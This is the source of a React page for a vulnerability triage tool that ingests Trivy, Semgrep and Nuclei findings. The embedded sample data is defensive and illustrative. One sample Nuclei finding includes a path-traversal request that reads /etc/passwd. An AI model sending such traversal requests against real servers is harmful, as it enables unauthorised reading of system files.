"use client";

import { useState, useRef } from "react";
import Link from "next/link";
import type { BulkExactReportResponse } from "@/lib/api/types";

interface FormData {
  title: string;
  severity: "critical" | "high" | "medium" | "low";
  cve: string;
  cwe: string;
  tool_name: string;
  asset_name: string;
  target_location: string;
  description: string;
  evidence_payload: string;
  internet_exposed: boolean;
  criticality: "critical" | "high" | "medium" | "low";
}

interface CreatedCaseResult {
  case_id: string;
  title: string;
  priority?: {
    level?: string;
    score?: number;
  };
}

const INITIAL_FORM: FormData = {
  title: "",
  severity: "high",
  cve: "",
  cwe: "CWE-89",
  tool_name: "nuclei",
  asset_name: "core-gateway:v2.1",
  target_location: "/api/v1/auth/session",
  description: "",
  evidence_payload: "",
  internet_exposed: true,
  criticality: "critical",
};

const SAMPLE_PAYLOADS = {
  trivy: JSON.stringify(
    {
      Target: "backend/requirements.txt",
      Class: "lang-pkgs",
      Type: "pip",
      Vulnerabilities: [
        {
          VulnerabilityID: "CVE-2024-38606",
          PkgName: "aiohttp",
          InstalledVersion: "3.8.4",
          FixedVersion: "3.8.5",
          Severity: "HIGH",
          Title: "aiohttp: Directory traversal vulnerability in HTTP server static file handling",
          CweIDs: ["CWE-22"],
        },
      ],
    },
    null,
    2
  ),
  semgrep: JSON.stringify(
    {
      check_id: "rules.python.path-traversal.open",
      path: "handlers/static.py",
      start: { line: 45, col: 12 },
      extra: {
        message: "User-controlled filename passed directly to open() without path sanitation.",
        severity: "ERROR",
        metadata: {
          cwe: ["CWE-22: Path Traversal"],
          route: "/api/static/download",
        },
      },
    },
    null,
    2
  ),
  nuclei: JSON.stringify(
    {
      "template-id": "http-path-traversal",
      info: {
        name: "Arbitrary File Read via Path Traversal",
        severity: "high",
        classification: { "cve-id": "CVE-2023-38606", "cwe-id": ["cwe-22"] },
      },
      host: "https://api.cyberyukti.local",
      "matched-at": "https://api.cyberyukti.local/api/static/download?file=../../../../etc/passwd",
      request: "GET /api/static/download?file=../../../../etc/passwd HTTP/1.1",
    },
    null,
    2
  ),
};

const SAMPLE_CSV = `Title,Severity,Asset,CVE,CWE,Tool,Path
Log4j JNDI Remote Code Execution,CRITICAL,auth-service-prod:latest,CVE-2021-44228,CWE-502,trivy,pom.xml
Log4j JNDI Remote Code Execution,CRITICAL,auth-service-prod:latest,CVE-2021-44228,CWE-502,semgrep,services/auth.py
Spring4Shell Data Binding RCE,CRITICAL,order-service-api:v2,CVE-2022-22965,CWE-94,trivy,build.gradle
SQL Injection in Payment Search,HIGH,payment-gateway:v2,,CWE-89,semgrep,repositories/payment.go
SQL Injection in Payment Search,HIGH,payment-gateway:v2,,CWE-89,nuclei,/api/v2/payments/search
Path Traversal in Static Asset Downloader,HIGH,frontend-proxy,,CWE-22,semgrep,handlers/static.py
Path Traversal in Static Asset Downloader,HIGH,frontend-proxy,,CWE-22,nuclei,/api/static/download
Server-Side Request Forgery (SSRF),HIGH,notification-dispatch,,CWE-918,nuclei,/api/v1/webhooks/test
Hardcoded JWT Secret in Auth Controller,HIGH,auth-service-prod:latest,,CWE-798,semgrep,auth/jwt.ts
Reflected XSS in User Activity Log,MEDIUM,customer-portal-frontend,,CWE-79,nuclei,/portal/activity
`;

const API_BASE = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8000";

export default function NewVulnerabilityPage() {
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Tabs: "bulk" (Multi-Format / Links / 10k Benchmark), "manual" (Single Form), "json" (Raw Sandbox)
  const [activeTab, setActiveTab] = useState<"bulk" | "manual" | "json">("bulk");

  // Bulk / Multi-Format States
  const [bulkMode, setBulkMode] = useState<"upload" | "url" | "benchmark">("benchmark");
  const [benchmarkCount, setBenchmarkCount] = useState<number>(10000);
  const [remoteUrl, setRemoteUrl] = useState<string>("https://raw.githubusercontent.com/Sahas2711/CyberYukti/main/backend/fixtures/raw_scans/trivy_scan.json");
  const [uploadedFile, setUploadedFile] = useState<File | null>(null);
  const [uploadText, setUploadText] = useState<string>("");
  const [syncStore, setSyncStore] = useState<boolean>(true);
  const [processingBulk, setProcessingBulk] = useState<boolean>(false);
  const [exactReport, setExactReport] = useState<BulkExactReportResponse | null>(null);
  const [filterPriority, setFilterPriority] = useState<string>("ALL");
  const [searchCluster, setSearchCluster] = useState<string>("");

  // Manual Form States
  const [formData, setFormData] = useState<FormData>(INITIAL_FORM);
  const [jsonPayload, setJsonPayload] = useState(SAMPLE_PAYLOADS.nuclei);
  const [submitting, setSubmitting] = useState(false);
  const [createdCase, setCreatedCase] = useState<CreatedCaseResult | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Handle Manual Form Submit
  const handleSubmitManual = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitting(true);
    setErrorMsg(null);
    setCreatedCase(null);

    try {
      const payload = {
        title: formData.title,
        severity: formData.severity,
        cve: formData.cve || null,
        cwe: formData.cwe || null,
        tool_name: formData.tool_name,
        asset_name: formData.asset_name,
        target_location: formData.target_location,
        description: formData.description,
        evidence_payload: formData.evidence_payload,
        internet_exposed: formData.internet_exposed,
        criticality: formData.criticality,
      };

      const res = await fetch(`${API_BASE}/api/cases`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!res.ok) {
        const err = await res.json().catch(() => ({}));
        throw new Error(err.detail || `Server returned ${res.status}`);
      }

      const result = await res.json();
      setCreatedCase(result);
    } catch (err: unknown) {
      setErrorMsg(err instanceof Error ? err.message : "Failed to submit vulnerability.");
    } finally {
      setSubmitting(false);
    }
  };

  // Handle 10,000-Vulnerability Benchmark Execution
  const handleRun10kBenchmark = async () => {
    setProcessingBulk(true);
    setErrorMsg(null);
    setExactReport(null);

    try {
      const res = await fetch(
        `${API_BASE}/api/v1/scan/benchmark-10k?count=${benchmarkCount}&sync_store=${syncStore}`,
        { method: "POST" }
      );
      if (!res.ok) {
        const err = await res.json().catch(() => ({}));
        throw new Error(err.detail || `Server error: ${res.status}`);
      }
      const data: BulkExactReportResponse = await res.json();
      setExactReport(data);
    } catch (err: unknown) {
      setErrorMsg(err instanceof Error ? err.message : "Failed to run 10k enterprise benchmark.");
    } finally {
      setProcessingBulk(false);
    }
  };

  // Handle Remote Link Ingestion
  const handleIngestRemoteUrl = async () => {
    if (!remoteUrl.trim()) {
      setErrorMsg("Please provide a valid HTTP or HTTPS scan report URL.");
      return;
    }
    setProcessingBulk(true);
    setErrorMsg(null);
    setExactReport(null);

    try {
      const res = await fetch(`${API_BASE}/api/v1/scan/url`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: remoteUrl.trim(),
          sync_store: syncStore,
          default_asset: "remote-host",
        }),
      });

      if (!res.ok) {
        const err = await res.json().catch(() => ({}));
        throw new Error(err.detail || `Server error: ${res.status}`);
      }
      const data: BulkExactReportResponse = await res.json();
      setExactReport(data);
    } catch (err: unknown) {
      setErrorMsg(err instanceof Error ? err.message : "Failed to ingest remote URL.");
    } finally {
      setProcessingBulk(false);
    }
  };

  // Handle File Upload
  const handleFileUpload = async () => {
    if (!uploadedFile && !uploadText) {
      setErrorMsg("Please select a file to upload or paste scan content.");
      return;
    }
    setProcessingBulk(true);
    setErrorMsg(null);
    setExactReport(null);

    try {
      if (uploadedFile) {
        // Read file as text to avoid multipart boundary mismatches
        const text = await uploadedFile.text();
        const res = await fetch(`${API_BASE}/api/v1/scan/raw`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: text,
            filename: uploadedFile.name,
            sync_store: syncStore,
            default_asset: "uploaded-asset",
          }),
        });
        if (!res.ok) {
          const err = await res.json().catch(() => ({}));
          throw new Error(err.detail || `Server error: ${res.status}`);
        }
        const data: BulkExactReportResponse = await res.json();
        setExactReport(data);
      } else if (uploadText) {
        const res = await fetch(`${API_BASE}/api/v1/scan/raw`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: uploadText,
            filename: "pasted_report.csv",
            sync_store: syncStore,
            default_asset: "pasted-asset",
          }),
        });
        if (!res.ok) {
          const err = await res.json().catch(() => ({}));
          throw new Error(err.detail || `Server error: ${res.status}`);
        }
        const data: BulkExactReportResponse = await res.json();
        setExactReport(data);
      }
    } catch (err: unknown) {
      setErrorMsg(err instanceof Error ? err.message : "Failed to process scan file.");
    } finally {
      setProcessingBulk(false);
    }
  };

  // Export JSON Report
  const handleExportJson = () => {
    if (!exactReport) return;
    const blob = new Blob([JSON.stringify(exactReport, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `cyberyukti_exact_report_${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Export CSV Summary
  const handleExportCsv = () => {
    if (!exactReport) return;
    const headers = ["Cluster ID", "Priority", "Risk Score", "Title", "Asset", "CVE", "CWE", "Raw Findings Count", "Tools", "SLA"];
    const rows = exactReport.clusters_sample.map((c) => [
      c.cluster_id,
      c.priority,
      c.final_score,
      `"${c.title.replace(/"/g, '""')}"`,
      `"${c.target_asset}"`,
      c.primary_cve || "N/A",
      c.root_cause_cwe || "N/A",
      c.raw_findings_count,
      `"${c.participating_tools.join(", ")}"`,
      c.sla,
    ]);
    const csvContent = [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");
    const blob = new Blob([csvContent], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `cyberyukti_clusters_summary_${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Filtered clusters for the report view
  const filteredClusters = (exactReport?.clusters_sample || []).filter((c) => {
    const matchesPriority = filterPriority === "ALL" || c.priority === filterPriority;
    const matchesSearch =
      !searchCluster ||
      c.title.toLowerCase().includes(searchCluster.toLowerCase()) ||
      c.target_asset.toLowerCase().includes(searchCluster.toLowerCase()) ||
      (c.primary_cve && c.primary_cve.toLowerCase().includes(searchCluster.toLowerCase())) ||
      (c.root_cause_cwe && c.root_cause_cwe.toLowerCase().includes(searchCluster.toLowerCase()));
    return matchesPriority && matchesSearch;
  });

  return (
    <div className="mx-auto max-w-[1400px] space-y-6 px-5 py-6 lg:px-8">
      {/* Header */}
      <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between border-b border-line pb-4">
        <div>
          <div className="flex items-center gap-2">
            <span className="h-2 w-2 rounded-full bg-accent animate-pulse" />
            <h1 className="hk-label">CYBERYUKTI / INTAKE & TRIAGE ENGINE</h1>
          </div>
          <p className="text-xl font-bold tracking-tight text-tx-primary sm:text-2xl mt-1">
            Vulnerability Intake & High-Scale Ingestion Engine
          </p>
          <p className="text-xs text-tx-secondary mt-0.5">
            Ingest 1 to 10,000+ multi-scanner findings via JSON, CSV, SARIF, or remote links with GitLab Triple-Tuple Deduplication & Person 3 Risk Scoring.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <Link
            href="/cases"
            className="rounded-md border border-line bg-graphite px-3 py-1.5 text-xs font-medium text-tx-secondary hover:text-tx-primary hover:border-line-strong transition-all"
          >
            ← View Triage Queue
          </Link>
          <Link
            href="/"
            className="rounded-md border border-accent/40 bg-accent/10 px-3 py-1.5 text-xs font-semibold text-accent hover:bg-accent/20 transition-all"
          >
            Dashboard Overview
          </Link>
        </div>
      </div>

      {/* Main Mode Tabs */}
      <div className="flex flex-wrap gap-2 border-b border-line pb-2">
        <button
          onClick={() => {
            setActiveTab("bulk");
            setErrorMsg(null);
          }}
          className={`flex items-center gap-2 px-4 py-2 text-xs font-bold uppercase tracking-wider rounded-md transition-all ${
            activeTab === "bulk"
              ? "bg-accent text-black shadow-sm font-extrabold"
              : "bg-graphite border border-line text-tx-secondary hover:text-tx-primary"
          }`}
        >
          <span>⚡ High-Scale & Multi-Format Ingestion</span>
          <span className="px-1.5 py-0.2 rounded bg-black/20 text-[10px]">10,000+ Vulns</span>
        </button>

        <button
          onClick={() => {
            setActiveTab("manual");
            setErrorMsg(null);
          }}
          className={`px-4 py-2 text-xs font-bold uppercase tracking-wider rounded-md transition-all ${
            activeTab === "manual"
              ? "bg-accent text-black shadow-sm font-extrabold"
              : "bg-graphite border border-line text-tx-secondary hover:text-tx-primary"
          }`}
        >
          Guided Vulnerability Reporter
        </button>

        <button
          onClick={() => {
            setActiveTab("json");
            setErrorMsg(null);
          }}
          className={`px-4 py-2 text-xs font-bold uppercase tracking-wider rounded-md transition-all ${
            activeTab === "json"
              ? "bg-accent text-black shadow-sm font-extrabold"
              : "bg-graphite border border-line text-tx-secondary hover:text-tx-primary"
          }`}
        >
          Scanner JSON Sandbox
        </button>
      </div>

      {/* Error Alert */}
      {errorMsg && (
        <div className="rounded-md border border-rose-500/40 bg-rose-500/10 p-4 text-xs text-rose-400">
          <p className="font-bold uppercase tracking-wider">Ingestion Pipeline Error</p>
          <p className="mt-1">{errorMsg}</p>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 1: HIGH-SCALE & MULTI-FORMAT INGESTION (JSON, CSV, SARIF, URL, 10K) */}
      {/* ========================================================================= */}
      {activeTab === "bulk" && (
        <div className="space-y-6">
          {/* Sub-modes for Bulk Intake */}
          <div className="rounded-md border border-line bg-graphite p-5 shadow-sm space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-line pb-3">
              <div>
                <h2 className="text-sm font-bold uppercase tracking-wider text-tx-primary flex items-center gap-2">
                  <span>Input Method Selection</span>
                  <span className="rounded bg-sky-500/20 text-sky-400 text-[10px] px-2 py-0.5 border border-sky-500/30">
                    JSON • CSV • SARIF • XML • Remote URL
                  </span>
                </h2>
                <p className="text-xs text-tx-secondary mt-0.5">
                  Choose how to feed scanner findings into the GitLab Triple-Tuple Deduplication & Risk Scoring Pipeline.
                </p>
              </div>

              {/* Ingestion Sub-Mode Switcher */}
              <div className="flex items-center gap-1.5 p-1 rounded-md bg-graphite-deep border border-line">
                <button
                  onClick={() => setBulkMode("benchmark")}
                  className={`px-3 py-1 text-xs font-semibold rounded transition-all ${
                    bulkMode === "benchmark" ? "bg-accent text-black" : "text-tx-secondary hover:text-tx-primary"
                  }`}
                >
                  ⚡ 10k Enterprise Benchmark
                </button>
                <button
                  onClick={() => setBulkMode("upload")}
                  className={`px-3 py-1 text-xs font-semibold rounded transition-all ${
                    bulkMode === "upload" ? "bg-accent text-black" : "text-tx-secondary hover:text-tx-primary"
                  }`}
                >
                  📁 File Upload (JSON/CSV/SARIF)
                </button>
                <button
                  onClick={() => setBulkMode("url")}
                  className={`px-3 py-1 text-xs font-semibold rounded transition-all ${
                    bulkMode === "url" ? "bg-accent text-black" : "text-tx-secondary hover:text-tx-primary"
                  }`}
                >
                  🔗 Remote Link / URL
                </button>
              </div>
            </div>

            {/* Universal Sample Datasets Download Banner */}
            <div className="flex flex-wrap items-center justify-between gap-3 p-3 rounded-md border border-accent/30 bg-accent/5">
              <div className="flex items-center gap-2">
                <span className="text-sm">🧪</span>
                <div>
                  <span className="text-xs font-bold text-tx-primary">Ready-to-Use Benchmark Test Datasets</span>
                  <p className="text-[11px] text-tx-secondary">Download sample test files curated for all pipeline test cases (Trivy, Semgrep, Nuclei) or full 10k enterprise alert storm:</p>
                </div>
              </div>
              <div className="flex flex-wrap items-center gap-2">
                <a
                  href={`${API_BASE}/api/v1/scan/samples/test-cases.csv`}
                  download="sample_test_scans.csv"
                  className="rounded border border-accent/40 bg-accent/15 px-2.5 py-1 text-[11px] font-mono font-bold text-accent hover:bg-accent/25 transition-all flex items-center gap-1 shadow-sm"
                >
                  📥 test-cases.csv (18 Cases)
                </a>
                <a
                  href={`${API_BASE}/api/v1/scan/samples/test-cases.json`}
                  download="sample_test_scans.json"
                  className="rounded border border-accent/40 bg-accent/15 px-2.5 py-1 text-[11px] font-mono font-bold text-accent hover:bg-accent/25 transition-all flex items-center gap-1 shadow-sm"
                >
                  📥 test-cases.json (18 Cases)
                </a>
                <a
                  href={`${API_BASE}/api/v1/scan/samples/10k.csv`}
                  download="sample_10000_vulnerabilities.csv"
                  className="rounded border border-line bg-graphite-deep px-2.5 py-1 text-[11px] font-mono text-tx-secondary hover:text-tx-primary hover:border-line-strong transition-all flex items-center gap-1"
                >
                  📥 10k.csv (2.9 MB)
                </a>
                <a
                  href={`${API_BASE}/api/v1/scan/samples/10k.json`}
                  download="sample_10000_vulnerabilities.json"
                  className="rounded border border-line bg-graphite-deep px-2.5 py-1 text-[11px] font-mono text-tx-secondary hover:text-tx-primary hover:border-line-strong transition-all flex items-center gap-1"
                >
                  📥 10k.json (8.6 MB)
                </a>
              </div>
            </div>

            {/* Option A: 10,000 Enterprise Benchmark */}
            {bulkMode === "benchmark" && (
              <div className="space-y-4 pt-1">
                <div className="rounded-md border border-accent/30 bg-accent/5 p-4 space-y-3">
                  <div className="flex items-start justify-between">
                    <div>
                      <span className="font-mono text-[10px] uppercase font-bold text-accent px-2 py-0.5 rounded border border-accent/40 bg-accent/10">
                        National Level Hackathon Stress-Test Engine
                      </span>
                      <h3 className="text-base font-bold text-tx-primary mt-1.5">
                        High-Scale Enterprise Scanner Simulator (~10,000 Findings)
                      </h3>
                      <p className="text-xs text-tx-secondary mt-1 leading-relaxed max-w-3xl">
                        Simulates a massive, real-world enterprise vulnerability scan alert storm spanning <strong>12 production microservices</strong> (auth, payments, gateways, ingress, databases) across <strong>Trivy SCA/Container</strong>, <strong>Semgrep SAST</strong>, and <strong>Nuclei DAST</strong>.
                        The engine normalizes findings, executes 3-stage deduplication (Exact Hash + GitLab Triple-Tuple + Cross-Tool Route Correlation), calculates Person 3 dynamic risk scores, and compiles an exact technical and executive report.
                      </p>
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center gap-6 pt-2">
                    <div className="flex items-center gap-3">
                      <label className="text-xs font-bold text-tx-secondary">Benchmark Volume:</label>
                      <select
                        value={benchmarkCount}
                        onChange={(e) => setBenchmarkCount(Number(e.target.value))}
                        className="rounded-md border border-line bg-graphite-deep px-3 py-1.5 text-xs text-tx-primary font-mono focus:border-accent focus:outline-none"
                      >
                        <option value={1000}>1,000 Findings (Fast Preview)</option>
                        <option value={5000}>5,000 Findings (Mid-Scale)</option>
                        <option value={10000}>10,000 Findings (Full Enterprise Benchmark)</option>
                        <option value={20000}>20,000 Findings (Extreme Stress Test)</option>
                      </select>
                    </div>

                    <div className="flex items-center gap-2">
                      <input
                        type="checkbox"
                        id="sync-store-bench"
                        checked={syncStore}
                        onChange={(e) => setSyncStore(e.target.checked)}
                        className="rounded border-line bg-graphite-deep text-accent focus:ring-accent"
                      />
                      <label htmlFor="sync-store-bench" className="text-xs text-tx-secondary select-none cursor-pointer">
                        Sync results to live Triage Work Queue & Dashboard stats
                      </label>
                    </div>

                    <button
                      onClick={handleRun10kBenchmark}
                      disabled={processingBulk}
                      className="ml-auto rounded-md bg-accent px-5 py-2 text-xs font-bold uppercase tracking-wider text-black hover:bg-accent/90 disabled:opacity-50 transition-all flex items-center gap-2 shadow-md"
                    >
                      {processingBulk ? (
                        <>
                          <span className="h-3.5 w-3.5 border-2 border-black border-t-transparent rounded-full animate-spin" />
                          <span>Processing {benchmarkCount.toLocaleString()} Findings...</span>
                        </>
                      ) : (
                        <>
                          <span>⚡ Execute {benchmarkCount.toLocaleString()} Pipeline Benchmark</span>
                        </>
                      )}
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* Option B: Multi-Format File Upload (JSON, CSV, SARIF) */}
            {bulkMode === "upload" && (
              <div className="space-y-4 pt-1">
                {/* Download Sample Files Bar */}
                <div className="flex flex-wrap items-center gap-2 p-2.5 rounded-md border border-line bg-graphite-deep/70">
                  <span className="text-xs font-bold text-tx-secondary">Download Benchmark Test Datasets:</span>
                  <a
                    href={`${API_BASE}/api/v1/scan/samples/test-cases.csv`}
                    download="sample_test_scans.csv"
                    className="rounded border border-accent/40 bg-accent/10 px-2.5 py-1 text-[11px] font-mono text-accent hover:bg-accent/20 transition-all flex items-center gap-1 font-bold"
                  >
                    📥 test-cases.csv (18 Cases)
                  </a>
                  <a
                    href={`${API_BASE}/api/v1/scan/samples/test-cases.json`}
                    download="sample_test_scans.json"
                    className="rounded border border-accent/40 bg-accent/10 px-2.5 py-1 text-[11px] font-mono text-accent hover:bg-accent/20 transition-all flex items-center gap-1 font-bold"
                  >
                    📥 test-cases.json (18 Cases)
                  </a>
                  <a
                    href={`${API_BASE}/api/v1/scan/samples/10k.csv`}
                    download="sample_10000_vulnerabilities.csv"
                    className="rounded border border-line bg-graphite px-2.5 py-1 text-[11px] font-mono text-tx-secondary hover:text-tx-primary hover:border-line-strong transition-all flex items-center gap-1"
                  >
                    📥 10k_vulns.csv (2.9 MB)
                  </a>
                  <a
                    href={`${API_BASE}/api/v1/scan/samples/10k.json`}
                    download="sample_10000_vulnerabilities.json"
                    className="rounded border border-line bg-graphite px-2.5 py-1 text-[11px] font-mono text-tx-secondary hover:text-tx-primary hover:border-line-strong transition-all flex items-center gap-1"
                  >
                    📥 10k_vulns.json (8.6 MB)
                  </a>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* File Upload Box */}
                  <div
                    onClick={() => fileInputRef.current?.click()}
                    className="border-2 border-dashed border-line-strong hover:border-accent rounded-md p-6 text-center cursor-pointer transition-all bg-graphite-deep/60 flex flex-col items-center justify-center min-h-[160px]"
                  >
                    <input
                      ref={fileInputRef}
                      type="file"
                      accept=".json,.csv,.sarif,.xml,.txt"
                      onChange={(e) => {
                        const file = e.target.files?.[0];
                        if (file) {
                          setUploadedFile(file);
                        }
                      }}
                      className="hidden"
                    />
                    <div className="h-10 w-10 rounded-full bg-accent/10 border border-accent/30 flex items-center justify-center text-accent mb-2">
                      <svg className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                      </svg>
                    </div>
                    <p className="text-xs font-bold text-tx-primary">
                      {uploadedFile ? uploadedFile.name : "Click to browse or drag & drop scan report"}
                    </p>
                    <p className="text-[11px] text-tx-tertiary mt-1">
                      {uploadedFile
                        ? `${(uploadedFile.size / 1024).toFixed(1)} KB • Ready for pipeline execution`
                        : "Supports .JSON (Trivy, Semgrep, Nuclei), .CSV (Qualys, Nessus, Tenable), or .SARIF"}
                    </p>
                  </div>

                  {/* Paste / Direct Input Box */}
                  <div className="flex flex-col space-y-2">
                    <div className="flex items-center justify-between">
                      <label className="text-xs font-bold text-tx-secondary">Or Paste Scan Content (CSV / JSON):</label>
                      <button
                        type="button"
                        onClick={() => {
                          setUploadText(SAMPLE_CSV);
                          setUploadedFile(null);
                        }}
                        className="text-[10px] font-mono text-accent hover:underline"
                      >
                        Load Sample CSV (10 Findings)
                      </button>
                    </div>
                    <textarea
                      rows={6}
                      value={uploadText}
                      onChange={(e) => {
                        setUploadText(e.target.value);
                        setUploadedFile(null);
                      }}
                      placeholder="Paste raw CSV rows (Title,Severity,Asset,CVE,CWE,Tool,Path) or JSON array..."
                      className="w-full rounded-md border border-line bg-graphite-deep p-2.5 font-mono text-xs text-tx-primary focus:border-accent focus:outline-none resize-none"
                    />
                  </div>
                </div>

                <div className="flex items-center justify-between border-t border-line pt-3">
                  <div className="flex items-center gap-2">
                    <input
                      type="checkbox"
                      id="sync-store-upload"
                      checked={syncStore}
                      onChange={(e) => setSyncStore(e.target.checked)}
                      className="rounded border-line bg-graphite-deep text-accent focus:ring-accent"
                    />
                    <label htmlFor="sync-store-upload" className="text-xs text-tx-secondary select-none cursor-pointer">
                      Sync results to live Triage Work Queue & Dashboard stats
                    </label>
                  </div>

                  <button
                    onClick={handleFileUpload}
                    disabled={processingBulk || (!uploadedFile && !uploadText.trim())}
                    className="rounded-md bg-accent px-5 py-2 text-xs font-bold uppercase tracking-wider text-black hover:bg-accent/90 disabled:opacity-50 transition-all flex items-center gap-2 shadow-md"
                  >
                    {processingBulk ? (
                      <>
                        <span className="h-3.5 w-3.5 border-2 border-black border-t-transparent rounded-full animate-spin" />
                        <span>Running Deduplication Pipeline...</span>
                      </>
                    ) : (
                      <>
                        <span>Run Pipeline on File</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            )}

            {/* Option C: Remote Link / URL Ingestion */}
            {bulkMode === "url" && (
              <div className="space-y-4 pt-1">
                <div className="space-y-2">
                  <label className="text-xs font-bold text-tx-secondary">Remote Scan Report URL (HTTP / HTTPS):</label>
                  <div className="flex gap-2">
                    <input
                      type="url"
                      value={remoteUrl}
                      onChange={(e) => setRemoteUrl(e.target.value)}
                      placeholder="https://example.com/reports/trivy_scan.json"
                      className="flex-1 rounded-md border border-line bg-graphite-deep px-3 py-2 text-xs font-mono text-tx-primary focus:border-accent focus:outline-none"
                    />
                    <button
                      onClick={handleIngestRemoteUrl}
                      disabled={processingBulk || !remoteUrl.trim()}
                      className="rounded-md bg-accent px-5 py-2 text-xs font-bold uppercase tracking-wider text-black hover:bg-accent/90 disabled:opacity-50 transition-all flex items-center gap-2 shadow-md shrink-0"
                    >
                      {processingBulk ? (
                        <>
                          <span className="h-3.5 w-3.5 border-2 border-black border-t-transparent rounded-full animate-spin" />
                          <span>Fetching & Ingesting...</span>
                        </>
                      ) : (
                        <span>Fetch & Ingest Link</span>
                      )}
                    </button>
                  </div>
                </div>

                <div className="flex flex-wrap gap-2 text-[11px] text-tx-tertiary">
                  <span className="font-semibold text-tx-secondary">Quick Test Presets:</span>
                  <button
                    onClick={() => setRemoteUrl("https://raw.githubusercontent.com/aquasecurity/trivy/main/test/testdata/fixtures/report/summary.json")}
                    className="hover:text-accent underline font-mono"
                  >
                    Trivy Repo Fixture
                  </button>
                  <span>•</span>
                  <button
                    onClick={() => setRemoteUrl("https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/scans/sample.json")}
                    className="hover:text-accent underline font-mono"
                  >
                    Nuclei DAST Template
                  </button>
                </div>

                <div className="flex items-center gap-2 pt-2 border-t border-line">
                  <input
                    type="checkbox"
                    id="sync-store-url"
                    checked={syncStore}
                    onChange={(e) => setSyncStore(e.target.checked)}
                    className="rounded border-line bg-graphite-deep text-accent focus:ring-accent"
                  />
                  <label htmlFor="sync-store-url" className="text-xs text-tx-secondary select-none cursor-pointer">
                    Sync results to live Triage Work Queue & Dashboard stats
                  </label>
                </div>
              </div>
            )}
          </div>

          {/* ========================================================================= */}
          {/* EXACT PIPELINE REPORT VIEW (RENDERED AFTER PIPELINE COMPLETION) */}
          {/* ========================================================================= */}
          {exactReport && (
            <div className="space-y-6 animate-fadeIn">
              {/* Report Header Banner */}
              <div className="rounded-md border border-accent/40 bg-graphite p-6 shadow-md">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-line pb-4">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="font-mono text-[10px] uppercase font-extrabold px-2 py-0.5 rounded bg-accent text-black">
                        EXACT PIPELINE AUDIT REPORT
                      </span>
                      <span className="text-xs font-mono text-tx-tertiary">
                        Latency: {exactReport.summary.execution_time_ms} ms
                      </span>
                    </div>
                    <h2 className="text-xl font-bold text-tx-primary mt-1">
                      {exactReport.summary.pipeline_name}
                    </h2>
                    <p className="text-xs text-tx-secondary mt-0.5">
                      GitLab Enterprise Triple-Tuple standard applied across {exactReport.summary.total_assets_covered} assets.
                    </p>
                  </div>

                  {/* Export and Action Buttons */}
                  <div className="flex flex-wrap items-center gap-2">
                    <button
                      onClick={handleExportJson}
                      className="rounded-md border border-line bg-graphite-deep px-3 py-1.5 text-xs font-semibold text-tx-primary hover:border-accent hover:text-accent transition-all flex items-center gap-1.5"
                    >
                      <span>📥 Download JSON</span>
                    </button>
                    <button
                      onClick={handleExportCsv}
                      className="rounded-md border border-line bg-graphite-deep px-3 py-1.5 text-xs font-semibold text-tx-primary hover:border-accent hover:text-accent transition-all flex items-center gap-1.5"
                    >
                      <span>📊 Export CSV</span>
                    </button>
                    <button
                      onClick={() => window.print()}
                      className="rounded-md border border-line bg-graphite-deep px-3 py-1.5 text-xs font-semibold text-tx-primary hover:border-accent hover:text-accent transition-all flex items-center gap-1.5"
                    >
                      <span>🖨️ Print Report</span>
                    </button>
                    <Link
                      href="/cases"
                      className="rounded-md bg-accent px-4 py-1.5 text-xs font-bold text-black hover:bg-accent/90 transition-all flex items-center gap-1.5"
                    >
                      <span>View Triage Cases →</span>
                    </Link>
                  </div>
                </div>

                {/* 4 Core KPI Metric Cards */}
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 pt-5">
                  <div className="rounded-md border border-line bg-graphite-deep p-4">
                    <span className="text-[10px] font-mono uppercase text-tx-tertiary">Raw Findings Ingested</span>
                    <p className="text-2xl font-extrabold text-tx-primary mt-1 tabular-nums">
                      {exactReport.summary.total_raw_findings.toLocaleString()}
                    </p>
                    <span className="text-[10px] text-tx-secondary mt-0.5 block">Pre-dedup scanner alerts</span>
                  </div>

                  <div className="rounded-md border border-accent/40 bg-accent/5 p-4">
                    <span className="text-[10px] font-mono uppercase text-accent font-bold">Actionable Clusters</span>
                    <p className="text-2xl font-extrabold text-accent mt-1 tabular-nums">
                      {exactReport.summary.total_clusters.toLocaleString()}
                    </p>
                    <span className="text-[10px] text-tx-secondary mt-0.5 block">Unique grouped incidents</span>
                  </div>

                  <div className="rounded-md border border-line bg-graphite-deep p-4">
                    <span className="text-[10px] font-mono uppercase text-tx-tertiary">Noise Reduction</span>
                    <p className="text-2xl font-extrabold text-emerald-400 mt-1 tabular-nums">
                      {exactReport.summary.noise_reduction_percentage.toFixed(1)}%
                    </p>
